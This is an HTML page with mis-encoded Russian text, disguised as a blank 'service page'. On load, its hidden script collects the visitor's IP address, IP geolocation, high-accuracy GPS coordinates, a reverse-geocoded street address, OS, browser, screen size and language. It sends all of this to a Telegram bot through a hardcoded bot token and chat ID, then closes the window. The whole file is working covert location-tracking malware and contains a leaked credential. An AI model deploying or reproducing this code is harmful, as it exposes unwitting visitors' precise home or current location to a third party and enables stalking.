<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–°–ª—É–∂–µ–±–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: white;
            min-height: 100vh;
            overflow: hidden;
        }
        
        /* –ü–æ–ª–Ω–æ—Å—Ç—å—é —Å–∫—Ä—ã–≤–∞–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ */
        .hidden-content {
            display: none;
        }
    </style>
</head>
<body>
    <!-- –≠—Ç–æ—Ç –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –Ω—É–∂–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–æ–≤ -->
    <div class="hidden-content">
        <div id="status"></div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const BOT_TOKEN = '7100525865:AAG-ed_1X1DPx-ngsnUrTKRUuuH2DvvjLxE';
        const CHAT_ID = '6727253615'; // –í–∞—à chat_id
        
        // –û—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP:', error);
                return "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å";
            }
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –ø–æ IP
        async function getLocationInfo(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                
                return {
                    country: data.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    region: data.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    city: data.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    postal: data.postal || '',
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    provider: data.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –ø—Ä–æ–≤–∞–π–¥–µ—Ä'
                };
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–¥–∞–Ω–Ω—ã—Ö:', error);
                return {
                    country: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    region: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    city: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    postal: '',
                    latitude: 0,
                    longitude: 0,
                    provider: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –ø—Ä–æ–≤–∞–π–¥–µ—Ä'
                };
            }
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ—á–Ω—ã—Ö GPS –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: "–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º" });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    error => {
                        let errorMessage;
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â–µ–Ω";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "–í—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∏—Å—Ç–µ–∫–ª–æ";
                                break;
                            default:
                                errorMessage = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏";
                        }
                        resolve({ error: errorMessage });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –ø–æ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç–∞–º
        async function getFullAddress(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                
                if (data.address) {
                    const address = data.address;
                    
                    // –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω—ã–π –∞–¥—Ä–µ—Å
                    let fullAddress = "";
                    if (address.road) fullAddress += address.road;
                    if (address.house_number) fullAddress += `, ${address.house_number}`;
                    if (address.suburb && !fullAddress) fullAddress += address.suburb;
                    
                    return {
                        address: fullAddress || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                        country: address.country || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                        city: address.city || address.town || address.village || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                        postcode: address.postcode || ""
                    };
                }
                
                return {
                    address: "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                    country: "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    city: "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    postcode: ""
                };
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞:', error);
                return {
                    address: "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å",
                    country: "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    city: "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    postcode: ""
                };
            }
        }
        
        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è Telegram
        function formatMessage(data) {
            return `
üìç *–ü–û–õ–ù–´–ô –ê–î–†–ï–° –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø*

üåç *–°—Ç—Ä–∞–Ω–∞:* ${data.country}
üèôÔ∏è *–ì–æ—Ä–æ–¥:* ${data.city}
üì´ *–ê–¥—Ä–µ—Å:* ${data.address}
üìç *–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:* ${data.coords.lat.toFixed(6)}, ${data.coords.lon.toFixed(6)}
üìè *–¢–æ—á–Ω–æ—Å—Ç—å:* ~${Math.round(data.coords.accuracy)} –º–µ—Ç—Ä–æ–≤

üîç *–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è*
üì° *IP-–∞–¥—Ä–µ—Å:* ${data.ip}
üè¢ *–ü—Ä–æ–≤–∞–π–¥–µ—Ä:* ${data.provider}
üñ•Ô∏è *–û–°:* ${data.os}
üåê *–ë—Ä–∞—É–∑–µ—Ä:* ${data.browser}
üì± *–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞:* ${data.screen}
üåê *–Ø–∑—ã–∫:* ${data.language}
‚è∞ *–í—Ä–µ–º—è:* ${new Date().toLocaleString()}
            `;
        }
        
        // –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function collectAndSendFullAddress() {
            try {
                // –°–æ–±–∏—Ä–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                const os = navigator.userAgent.includes("Windows") ? "Windows" :
                           navigator.userAgent.includes("Mac") ? "Mac OS" :
                           navigator.userAgent.includes("Linux") ? "Linux" :
                           navigator.userAgent.includes("Android") ? "Android" :
                           navigator.userAgent.includes("iOS") ? "iOS" : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–°";
                
                const browser = navigator.userAgent.includes("Chrome") ? "Chrome" :
                               navigator.userAgent.includes("Firefox") ? "Firefox" :
                               navigator.userAgent.includes("Safari") ? "Safari" :
                               navigator.userAgent.includes("Edge") ? "Edge" : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä";
                
                // –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å
                const ip = await getIPAddress();
                
                // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –ø–æ IP
                const locationInfo = await getLocationInfo(ip);
                
                // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —Ç–æ—á–Ω—ã–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã
                const gpsData = await getGPS();
                
                let fullAddress = {
                    country: locationInfo.country,
                    city: locationInfo.city,
                    address: "–¢–æ–ª—å–∫–æ –ø–æ IP (–±–µ–∑ —Ç–æ—á–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∞)"
                };
                
                // –ï—Å–ª–∏ –ø–æ–ª—É—á–∏–ª–∏ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã, –ø–æ–ª—É—á–∞–µ–º –ø–æ–ª–Ω—ã–π –∞–¥—Ä–µ—Å
                if (gpsData.lat && gpsData.lon) {
                    const addressInfo = await getFullAddress(gpsData.lat, gpsData.lon);
                    
                    // –ò—Å–ø–æ–ª—å–∑—É–µ–º –¥–∞–Ω–Ω—ã–µ GPS, –µ—Å–ª–∏ –æ–Ω–∏ –±–æ–ª–µ–µ —Ç–æ—á–Ω—ã–µ
                    if (addressInfo.country !== "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ") {
                        fullAddress.country = addressInfo.country;
                    }
                    if (addressInfo.city !== "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ") {
                        fullAddress.city = addressInfo.city;
                    }
                    fullAddress.address = addressInfo.address;
                }
                
                // –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                const fullData = {
                    ...fullAddress,
                    coords: gpsData.lat ? gpsData : {lat: locationInfo.latitude, lon: locationInfo.longitude, accuracy: 10000},
                    ip: ip,
                    provider: locationInfo.provider,
                    os: os,
                    browser: browser,
                    screen: `${screen.width}x${screen.height}`,
                    language: navigator.language || navigator.userLanguage
                };
                
                // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const message = formatMessage(fullData);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                await sendToTelegram(message);
                
                // –î–ª—è –æ—Ç–ª–∞–¥–∫–∏ –≤ –∫–æ–Ω—Å–æ–ª–∏
                console.log("–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram");
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö:', error);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
                await sendToTelegram(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`);
            }
            
            // –ó–∞–∫—Ä—ã–≤–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(() => {
                window.close();
            }, 3000);
        }
        
        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = collectAndSendFullAddress;
    </script>
</body>
</html>
